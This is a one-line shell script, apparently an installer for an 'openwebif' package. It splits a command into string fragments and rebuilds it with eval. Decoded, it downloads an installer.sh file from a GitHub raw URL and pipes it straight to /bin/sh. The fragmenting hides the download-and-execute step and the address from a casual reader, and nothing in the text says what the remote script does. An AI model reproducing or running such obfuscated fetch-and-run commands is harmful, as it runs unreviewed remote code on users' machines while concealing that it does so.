z="
";Az='wget';Ez='.git';Oz='if/m';Qz='inst';Bz=' htt';Iz='nt.c';Mz='/ope';Gz='serc';Jz='om/a';Uz=' - |';Wz='n/sh';Tz=' -qO';Dz='/raw';Hz='onte';Cz='ps:/';Kz='bo-b';Fz='hubu';Pz='ain/';Nz='nweb';Sz='r.sh';Lz='arby';Rz='alle';Vz=' /bi';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"